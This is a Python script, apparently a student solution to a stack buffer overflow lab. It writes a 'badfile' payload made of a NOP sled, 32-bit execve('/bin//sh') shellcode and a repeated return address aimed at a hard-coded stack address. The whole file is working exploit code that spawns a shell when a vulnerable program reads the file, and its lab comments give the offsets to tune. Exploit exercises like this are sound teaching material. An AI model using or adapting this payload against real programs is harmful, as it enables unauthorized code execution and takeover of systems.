#!/usr/bin/python3
import sys

shellcode = (
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
# So, you need to decide where to put shellcode in "content"

start = 517 - len(shellcode)  # Put the shellcode at the end
content[start:start + len(shellcode)] = shellcode

ebp_offset = 100          # start of the range which is (100-200)
offset = ebp_offset + 4
ebp_addr = 0xffffcbb8

# Decide the return address value
ret = ebp_addr + 120      # 120 as padding

# You must fill the content with necessary values...

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
# in the next line 100 will be the addition in offset thus, we can achieve the range from 100 to 200, and 25 is the times we will pur retun address in our content variable.
content[offset:offset + 100] = (ret).to_bytes(L, byteorder='little') * 25
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
